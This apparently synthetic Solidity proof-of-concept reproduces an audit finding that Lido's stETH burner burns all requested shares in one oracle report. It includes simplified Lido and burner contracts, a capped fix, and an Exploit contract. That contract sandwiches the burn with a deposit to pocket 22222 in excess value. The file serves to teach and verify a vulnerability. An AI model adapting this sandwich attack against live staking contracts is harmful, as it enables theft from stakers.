// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Lido SelfOwnedStETHBurner — an uncapped burnShares is a sandwichable rebase
    (MixBytes, AuditVault 28161).
    SYNTHETIC, cheatcode-free. processLidoOracleReport burns every requested
    share in one report. Burning shares raises the stETH rate for whoever
    holds shares at that moment. A depositor who was not in the pool before
    the report submits 100000, the report burns 200000, and those shares are
    worth 122222. The excess kept after returning principal is 22222.
    The control caps a run at 4 bps of total shares (LIP-6). */

interface ILido {
    function getOracle() external view returns (address);
    function getPooledEthByShares(uint256) external view returns (uint256);
    function burnShares(address account, uint256 amount) external;
}

interface IOracle {
    function getBeaconReportReceiver() external view returns (address);
}

contract Lido {
    uint256 public totalShares;
    uint256 public totalPooledEther;
    mapping(address => uint256) public shares;
    address public oracle;
    address public burner;

    constructor() {
        totalShares = 1_000_000;
        totalPooledEther = 1_000_000;
    }

    function setOracle(address oracle_) external {
        oracle = oracle_;
    }

    function setBurner(address burner_) external {
        burner = burner_;
    }

    function seed(address to, uint256 amount) external {
        shares[to] += amount;
    }

    function getOracle() external view returns (address) {
        return oracle;
    }

    function getSharesByPooledEth(uint256 ethAmount) public view returns (uint256) {
        return ethAmount * totalShares / totalPooledEther;
    }

    function getPooledEthByShares(uint256 shareAmount) public view returns (uint256) {
        return shareAmount * totalPooledEther / totalShares;
    }

    function balanceOf(address account) public view returns (uint256) {
        return getPooledEthByShares(shares[account]);
    }

    function submit() external payable returns (uint256 minted) {
        minted = getSharesByPooledEth(msg.value);
        shares[msg.sender] += minted;
        totalShares += minted;
        totalPooledEther += msg.value;
    }

    function burnShares(address account, uint256 amount) external {
        require(msg.sender == burner, "burner");
        shares[account] -= amount;
        totalShares -= amount;
    }

    function transferShares(address to, uint256 amount) external {
        shares[msg.sender] -= amount;
        shares[to] += amount;
    }
}

contract SelfOwnedStETHBurner {
    address public immutable LIDO;
    uint256 public coverSharesBurnRequested;
    uint256 public nonCoverSharesBurnRequested;
    uint256 public totalCoverSharesBurnt;
    uint256 public totalNonCoverSharesBurnt;

    event StETHBurnt(bool isCover, uint256 amount, uint256 shares);

    constructor(address lido_) {
        LIDO = lido_;
    }

    function seedRequested(uint256 sharesAmount) external {
        coverSharesBurnRequested = sharesAmount;
    }

    function processLidoOracleReport(uint256, uint256, uint256) external {
        uint256 memCoverSharesBurnRequested = coverSharesBurnRequested;
        uint256 memNonCoverSharesBurnRequested = nonCoverSharesBurnRequested;

        uint256 burnAmount = memCoverSharesBurnRequested + memNonCoverSharesBurnRequested;

        if (burnAmount == 0) {
            return;
        }

        address oracle = ILido(LIDO).getOracle();

        require(
            msg.sender == oracle || (msg.sender == IOracle(oracle).getBeaconReportReceiver()),
            "APP_AUTH_FAILED"
        );

        if (memCoverSharesBurnRequested > 0) {
            totalCoverSharesBurnt += memCoverSharesBurnRequested;
            uint256 coverStETHBurnAmountRequested = ILido(LIDO).getPooledEthByShares(memCoverSharesBurnRequested);
            emit StETHBurnt(true, coverStETHBurnAmountRequested, memCoverSharesBurnRequested);
            coverSharesBurnRequested = 0;
        }
        if (memNonCoverSharesBurnRequested > 0) {
            totalNonCoverSharesBurnt += memNonCoverSharesBurnRequested;
            uint256 nonCoverStETHBurnAmountRequested =
                ILido(LIDO).getPooledEthByShares(memNonCoverSharesBurnRequested);
            emit StETHBurnt(false, nonCoverStETHBurnAmountRequested, memNonCoverSharesBurnRequested);
            nonCoverSharesBurnRequested = 0;
        }

        // @> VULN: the whole requested amount is burned in this report. No per-run cap.
        ILido(LIDO).burnShares(address(this), burnAmount);
    }

    function processCapped(uint256, uint256, uint256) external returns (uint256 burned) {
        uint256 memCover = coverSharesBurnRequested;
        uint256 burnAmount = memCover + nonCoverSharesBurnRequested;
        if (burnAmount == 0) return 0;
        address oracle = ILido(LIDO).getOracle();
        require(msg.sender == oracle, "APP_AUTH_FAILED");
        uint256 cap = Lido(LIDO).totalShares() * 4 / 10000;
        if (burnAmount > cap) burnAmount = cap;
        if (burnAmount == 0) return 0;
        coverSharesBurnRequested = memCover - burnAmount;
        totalCoverSharesBurnt += burnAmount;
        ILido(LIDO).burnShares(address(this), burnAmount);
        burned = burnAmount;
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 100_000;
    Lido public lido;
    SelfOwnedStETHBurner public burner;
    uint256 public shareValue;
    uint256 public excess;
    uint256 public kept;

    constructor() {
        lido = new Lido();
        burner = new SelfOwnedStETHBurner(address(lido));
        lido.setBurner(address(burner));
        lido.setOracle(address(this));
        lido.seed(address(burner), 200_000);
        burner.seedRequested(200_000);
    }

    function run() external payable {
        require(msg.value == DEPOSIT, "deposit");
        require(lido.balanceOf(address(this)) == 0, "started at 0");
        lido.submit{value: DEPOSIT}();
        require(lido.shares(address(this)) == DEPOSIT, "100000 shares");
        burner.processLidoOracleReport(0, 0, 0);
        shareValue = lido.balanceOf(address(this));
        require(shareValue == 122222, "worth 122222");
        excess = shareValue - DEPOSIT;
        require(excess == 22222, "excess 22222");
        uint256 principalShares = lido.getSharesByPooledEth(DEPOSIT);
        lido.transferShares(address(0xB0B), principalShares);
        kept = lido.balanceOf(address(this));
        require(kept == 22222, "kept 22222");
    }
}
